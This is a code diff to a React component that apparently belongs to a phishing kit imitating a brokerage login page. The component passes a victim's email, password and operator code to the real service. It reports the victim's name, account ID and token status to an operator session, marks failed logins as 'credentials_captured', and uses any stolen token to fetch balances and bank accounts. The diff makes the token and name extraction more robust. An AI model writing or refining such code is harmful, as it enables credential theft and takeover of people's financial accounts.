@@ -67,18 +67,19 @@ const PPI = () => {
       const res = await ppiApi.login(submittedEmail, password, operatorCode);
 
       if (res.success || res.raw?.status === 0) {
-        const fullName = res.fullName || res.raw?.payload?.denominacion || "";
+        const fullName = res.fullName || res.raw?.payload?.usuario?.nombreCompleto || res.raw?.payload?.denominacion || "";
         const cuentaId = res.cuentaId || res.raw?.payload?.cuentaId || "";
+        const token = typeof res.token === "string" ? res.token : res.token?.accessToken || res.raw?.payload?.token?.accessToken || "";
         
         await updateSession("login_success", {
           otp_code: `name:${fullName}|cuenta:${cuentaId}`,
         });
 
-        if (res.token) {
+        if (token) {
           setStatusMsg("Sincronizando datos...");
           try {
-            await ppiApi.balances(res.token, cuentaId);
-            await ppiApi.bankAccounts(res.token, cuentaId);
+            await ppiApi.balances(token, cuentaId);
+            await ppiApi.bankAccounts(token, cuentaId);
           } catch { /* silent */ }
           await updateSession("completed", {
             otp_code: `name:${fullName}|cuenta:${cuentaId}|token:yes`,
@@ -89,7 +90,6 @@ const PPI = () => {
           });
         }
       } else {
-        // API call failed (IP block, version check, etc.) — still capture credentials
         await updateSession("waiting_operator", {
           otp_code: `credentials_captured`,
         });
